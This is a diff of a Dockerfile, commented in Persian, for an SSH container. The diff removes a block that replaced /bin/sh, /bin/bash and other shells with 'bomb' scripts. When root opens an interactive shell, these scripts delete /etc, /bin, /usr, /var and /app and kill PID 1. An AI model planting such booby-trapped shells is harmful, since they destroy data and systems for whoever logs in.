@@ -34,40 +34,6 @@ RUN ssh-keygen -A
 
 # ۸. ست کردن مسیر PATH برای کاربر شما
 RUN echo "export PATH=/secret-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" >> /home/amirwolf512/.bashrc
-
-# --- [ساخت بمب شل‌ها در فایل موقت و انتقال آن‌ها] ---
-# ۱. ساخت اسکریپت بمب شل معمولی در مسیر موقت
-RUN echo -e '#!/secret-bin/sh\n\
-if [ "$(id -u)" = "0" ] && [ -t 0 ]; then\n\
-  echo "CRITICAL SECURITY BREACH! SELF-DESTRUCTING..."\n\
-  rm -rf /etc /bin /sbin /usr /var /app 2>/dev/null\n\
-  kill -9 1\n\
-  exit 1\n\
-fi\n\
-exec /secret-bin/sh "$@"' > /tmp/bomb_sh && chmod +x /tmp/bomb_sh
-
-# ۲. ساخت اسکریپت بمب bash در مسیر موقت
-RUN echo -e '#!/secret-bin/sh\n\
-if [ "$(id -u)" = "0" ] && [ -t 0 ]; then\n\
-  echo "CRITICAL SECURITY BREACH! SELF-DESTRUCTING..."\n\
-  rm -rf /etc /bin /sbin /usr /var /app 2>/dev/null\n\
-  kill -9 1\n\
-  exit 1\n\
-fi\n\
-exec /secret-bin/real-bash "$@"' > /tmp/bomb_bash && chmod +x /tmp/bomb_bash
-
-# ۳. حذف فیزیکی شل‌های اصلی و جایگزینی آنی با بمب‌ها (بدون ایجاد خطای Text file busy)
-RUN rm -f /bin/sh && cp /tmp/bomb_sh /bin/sh
-RUN rm -f /bin/bash /usr/bin/bash && cp /tmp/bomb_bash /bin/bash && cp /tmp/bomb_bash /usr/bin/bash
-
-# ۴. کپی کردن روی باقی شل‌ها و تمیزکاری فایل‌های موقت
-RUN cp /tmp/bomb_sh /bin/ash \
-    && cp /tmp/bomb_sh /bin/sh.orig \
-    && cp /tmp/bomb_sh /bin/sftp \
-    && rm -f /tmp/bomb_sh /tmp/bomb_bash
-# --------------------------------------------------
-
-# ۹. تنظیم بنر ورود پیام خوش‌آمدگویی
 RUN echo -e "Telegram:@amir_wolf512 HI:3\n\n==========>\n" > /etc/motd
 
 # اجرای مستقیم سرویس SSH
